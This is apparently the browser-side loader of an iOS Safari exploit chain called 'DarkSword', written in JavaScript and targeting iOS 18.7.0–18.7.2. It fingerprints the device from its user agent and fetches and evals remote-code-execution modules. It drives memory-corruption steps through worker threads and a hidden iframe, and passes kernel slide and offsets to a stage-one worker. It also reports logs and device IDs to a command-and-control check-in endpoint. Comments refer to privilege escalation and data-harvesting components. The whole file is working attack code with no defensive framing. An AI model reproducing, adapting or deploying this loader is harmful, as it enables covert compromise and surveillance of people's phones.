var SERVER_LOG = false;
let logStart = new Date().getTime();
let logEntryID = 0;
var offsets = {};
var slide;
var chipset;
var device_model;
// `localHost` is only the asset-delivery origin.  C2 traffic is separate and
// must come from the centralized runtime configuration.
var localHost = (typeof location !== 'undefined' && location.origin) || '';
var c2Host = (typeof globalThis !== 'undefined' && globalThis.DS_C2_BASE) || '';
function c2Endpoint(path) {
    if (!c2Host) return '';
    return String(c2Host).replace(/\/$/, '') + '/' + String(path || '').replace(/^\//, '');
}
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    if (!SERVER_LOG && !reportError) return;
    let obj = {
        id: logEntryID++,
        text: out,
    };
    if (dumphex) {
        obj.hex = 1;
        obj.text = x;
    }
    let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
    const did = (globalThis.__DEVICE_ID__ || window.__DEVICE_ID__ || '');
    const didParam = did ? `&device_id=${encodeURIComponent(String(did))}` : '';
    const endpoint = c2Endpoint('/c2/api/checkin');
    if (!endpoint) return;
    const xhr = new XMLHttpRequest();
    xhr.open("GET", endpoint + "?type=exploit_log&" + req + didParam, false);
    xhr.send(null);
}
function markPeDone() {
    // 10min TTL is enforced by frame.html. Cookie is also set by delivery when
    // pe_worker.js is served (covers WebContent death before this runs).
    var ts = String(Date.now());
    try { localStorage.setItem('_x_pe_done', ts); } catch (e) {}
    try {
        document.cookie = '_x_pe_done=' + encodeURIComponent(ts) +
            '; Path=/; Max-Age=600; SameSite=Lax';
    } catch (e2) {}
}
function redirect() {
    // Do NOT navigate (old /404.html caused reload loops with re-entrant frame).
    markPeDone();
    try { if (typeof window.stop === 'function') window.stop(); } catch (e) {}
}
// Relative URLs resolve under /assets/js/; leading-/ paths use location.origin (delivery fallthrough).
// Retries + status/length checks — plain same-origin fetch.
function getJS(fname, method = 'GET', tries = 5) {
    const minLen = 1;
    for (let attempt = 1; attempt <= tries; attempt++) {
        try {
            let url = fname;
            if (typeof fname === 'string' && fname.startsWith('/') && localHost) {
                url = String(localHost).replace(/\/$/, '') + fname;
            }
            if (attempt > 1) {
                const sep = url.indexOf('?') >= 0 ? '&' : '?';
                url = url + sep + '_r=' + attempt;
            }
            const xhr = new XMLHttpRequest();
            xhr.open(method || 'GET', url, false);
            xhr.send(null);
            if (xhr.status >= 200 && xhr.status < 300 && xhr.responseText && xhr.responseText.length >= minLen) {
                return xhr.responseText;
            }
        } catch (e) {
            // retry
        }
    }
}
function iosVersionKey(v) {
    if (!v) return '';
    if (typeof v === 'string') {
        if (v.indexOf('.') >= 0) return v.replace(/\./g, ',');
        return v;
    }
    if (v.join) return v.join(',');
    return String(v);
}
function validateStage1Handoff() {
    if (!device_model) return false;
    if (!offsets || typeof offsets !== 'object') return false;
    if (Object.keys(offsets).length < 40) return false;
    if (slide == null || slide === undefined) return false;
    try {
        if (typeof slide === 'bigint' && slide === 0n) return false;
    } catch (e) {}
    return true;
}
function packOffsetsForTransfer(src) {
    var out = {};
    if (!src) return out;
    try {
        for (var k in src) {
            if (!Object.prototype.hasOwnProperty.call(src, k)) continue;
            var val = src[k];
            out[k] = (val != null && val.toString) ? val.toString() : String(val);
        }
    } catch (e) {}
    return out;
}
function postStage1ToWorker(worker, begin, origin, desiredHost) {
    var msg = {
        type: 'stage1',
        begin: begin,
        origin: origin,
        ios_version: iosVersionKey(ios_version),
        device_model: device_model,
        chipset: chipset,
        slide: (slide != null && slide.toString) ? slide.toString() : '0',
        offsets: packOffsetsForTransfer(offsets),
        desiredHost: desiredHost,
        SERVER_LOG: SERVER_LOG
    };
    try {
        worker.postMessage(msg);
        return true;
    } catch (e) {
        return false;
    }
}
const signal = new Uint8Array(8);
// Safari 18 can reject createImageBitmap(OffscreenCanvas) with
// `EncodingError: Decoding failed` for a blank canvas.  Use a valid 1x1 PNG
// fallback and keep the rejection inside the helper instead of surfacing it
// as a page-level unhandled Promise rejection.
const bitmapFallbackPng = new Uint8Array([137,80,78,71,13,10,26,10,0,0,0,13,73,72,68,82,0,0,0,1,0,0,0,1,8,6,0,0,0,31,21,196,137,0,0,0,13,73,68,65,84,120,156,99,248,207,192,240,31,0,5,0,1,255,137,153,61,29,0,0,0,0,73,69,78,68,174,66,96,130]);
const dlopen_worker = `(() => {
  const fallbackPng = new Uint8Array([137,80,78,71,13,10,26,10,0,0,0,13,73,72,68,82,0,0,0,1,0,0,0,1,8,6,0,0,0,31,21,196,137,0,0,0,13,73,68,65,84,120,156,99,248,207,192,240,31,0,5,0,1,255,137,153,61,29,0,0,0,0,73,69,78,68,174,66,96,130]);
  function makeBitmap() {
    try {
      const canvas = new OffscreenCanvas(1, 1);
      return createImageBitmap(canvas).catch(() =>
        createImageBitmap(new Blob([fallbackPng], { type: 'image/png' }))
      );
    } catch (e) {
      return createImageBitmap(new Blob([fallbackPng], { type: 'image/png' }));
    }
  }
  self.onmessage = function (e) {
    const {
      type,
      data
    } = e.data;
    switch (type) {
      case 'init':
        globalThis[0] = data;
        makeBitmap().then(bitmap => {
          globalThis[1] = bitmap;
          self.postMessage(null);
        }).catch(err => self.postMessage({ type: 'bitmap_failed', error: String(err && err.message || err) }));
        break;
      case 'dlopen':
        globalThis[1].close();
        break;
    }
  };
})();`;
const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript'});
const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);

// LIVE band: iOS 18.7.0 - 18.7.2
function parseIosVersion() {
    let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    if (!version) {
        const m = /CPU (?:iPhone )?OS ([0-9_]+)/.exec(navigator.userAgent);
        if (m) version = m[1];
    }
    if (version) return version.split('_').map(part => parseInt(part, 10));
    return null;
}
function pickLiveBand(v) {
    if (!v || !v.length) return null;
    // This loader is retained only for the older 18.7 worker.  iOS 18.4-18.6
    // is handled by the encrypted ds_rce_loader.js family.
    if (v[0] !== 18 || v[1] !== 7) return null;
    const pat = v[2] || 0;
    if (pat >= 3) return null; // 18.7.3+ is outside the supported matrix
    return { worker: 'rce_worker_18.7.js', module: 'rce_module_18.7.js', stage1_rce: true, band: '18.7', chain: 'darksword_18_7' };
}

(function() {
'use strict';
const ios_version = parseIosVersion();

const live_band = pickLiveBand(ios_version);
if (live_band) {
    // Keep the selected engine visible to diagnostics without loading any
    // module from another namespace.
    globalThis.__DS_SELECTED_CHAIN__ = live_band.chain || 'darksword_18_7';
    print('[chain] ' + globalThis.__DS_SELECTED_CHAIN__ + ' selected for iOS ' + (ios_version || []).join('.'), true);
}

// === 两日引擎分流：iOS 18.6 -> 主线程直接执行两日引擎（不走 worker） ===
    if (!live_band) {
    print('unsupported iOS ' + (ios_version ? (Array.isArray(ios_version) ? ios_version.join('.') : String(ios_version)) : 'unknown') + ' (LIVE=18.7.0-18.7.2)', true);
    redirect();
} else {
let workerCode = getJS(`${live_band.worker}?${Date.now()}`);
if (!workerCode || workerCode.length < 1000) {
    print('worker load failed: ' + live_band.worker, true);
    redirect();
} else {
let workerBlob = new Blob([workerCode],{type:'text/javascript'});
let workerBlobUrl = URL.createObjectURL(workerBlob);
(() => {
    function doRedirect() {
      redirect();
    }
    function main() {
        const randomValues = new Uint32Array(32);
        const begin = Date.now();
        const origin = location.origin;
        const worker = new Worker(workerBlobUrl);
        const dlopen_workers = [];
        async function prepare_dlopen_workers() {
        for (let i = 1; i <= 2; ++i) {
            const worker = new Worker(dlopen_worker_url);
            dlopen_workers.push(worker);
            await new Promise(r => {
            worker.postMessage({
                type: 'init',
                data: 0x11111111 * i
            });
            worker.onmessage = r;
            });
        }
        }
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '';
        iframe.style.height = 0;
        iframe.style.width = 0;
        document.body.appendChild(iframe);
        async function message_handler(e) {
        const data = e.data;
        switch (data.type) {
            case 'redirect':
            {
                markPeDone();
                doRedirect();
                break;
            }
            case 'pe_start':
            case 'pe_spawned':
            {
                markPeDone();
                // The 18.7 chain is self-contained. Never inject retired
                // Liangri/Qlqz_L preload, harvest, or polling assets here.
                print('[chain] DarkSword 18.7 worker ready; retired collector stack skipped', true);
                break;
            }
            case 'prepare_dlopen_workers':
            {
                await prepare_dlopen_workers();
                worker.postMessage({
                type: 'dlopen_workers_prepared'
                });
                break;
            }
            case 'trigger_dlopen1':
            {
                dlopen_workers[0].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen1'
                });
                break;
            }
            case 'trigger_dlopen2':
            {
                dlopen_workers[1].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen2'
                });
                break;
            }
            case 'sign_pointers':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'setup_fcall'
                });
                break;
            }
            case 'slow_fcall':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'slow_fcall_done'
                });
                break;
            }
            default:
            {
                break;
            }
        }
        }
        worker.onmessage = message_handler;
        try
        {
        let rceCode = getJS(`${live_band.module}?${Date.now()}`);
        // 18.6/18.7 stage1_rce: stub module only — never eval a large offset table on page.
        // 18.4/18.5: need real rce_module.js (22E + 22F76) for check_attempt.
        if (live_band.stage1_rce) {
            if (rceCode && rceCode.length >= 500) {
                print('stage1_rce: refusing large page module ' + live_band.module + ' (len=' + rceCode.length + ') — using worker offsets', true);
            } else if (rceCode && rceCode.length >= 1) {
                try { eval(rceCode); } catch (eStub) {}
            }
        } else {
            if (!rceCode || rceCode.length < 500) {
                print('module load failed: ' + live_band.module, true);
                return;
            }
            try {
                eval(rceCode);
            } catch (e) {
                print('module eval failed', true);
                return;
            }
        }
        // The worker receives a C2 address only when ENABLE_C2=true and
        // C2_ADDR is populated; asset loading continues to use localHost.
        let desiredHost = c2Host;
            // 18.6.x / 18.7.0-18.7.2: self-contained worker (stage1_rce)
            // 18.4.x / 18.5.x: check_attempt + stage1 handoff (serialized offsets)
            if(live_band.stage1_rce)
            {
                worker.postMessage({
                    type: 'stage1_rce',
                    desiredHost,
                    randomValues,
                    SERVER_LOG
                });
            }
            else
            {
        var attempt = new check_attempt();
        // Keep the legacy path observable: previously both rejection handlers
        // were empty, so a WebKit-side failure looked identical to a server
        // or network failure.  Only diagnostic status is reported; execution
        // gates and the retry behavior remain unchanged.
        function reportAttemptDiagnostic(kind, detail) {
            var msg = '[18.4][check_attempt] ' + kind + (detail ? ': ' + String(detail).slice(0, 220) : '');
            try { print(msg, true); } catch (_) {}
        }
        function onAttemptDone(result) {
            if (!result) {
                reportAttemptDiagnostic('result_false');
                return;
            }
            if (!validateStage1Handoff()) {
                reportAttemptDiagnostic('handoff_invalid');
                return;
            }
            reportAttemptDiagnostic('handoff_valid');
            postStage1ToWorker(worker, begin, origin, desiredHost);
        }
        reportAttemptDiagnostic('start_invoked');
        attempt.start().then((result) => {
            if (!result) {
                reportAttemptDiagnostic('first_result_false_retry');
                reportAttemptDiagnostic('retry_invoked');
                attempt.start().then(onAttemptDone).catch(function (e) {
                    reportAttemptDiagnostic('retry_rejected', e && (e.stack || e.message || e));
                });
            } else {
                onAttemptDone(true);
            }
        }).catch(function (e) {
            reportAttemptDiagnostic('first_rejected', e && (e.stack || e.message || e));
        });
            }
        }
        catch(e)
        {
       // print("Got exception on something: " + e);
        }
    }
    main();
  })();
} // workerCode ok
} // end live_band
})();
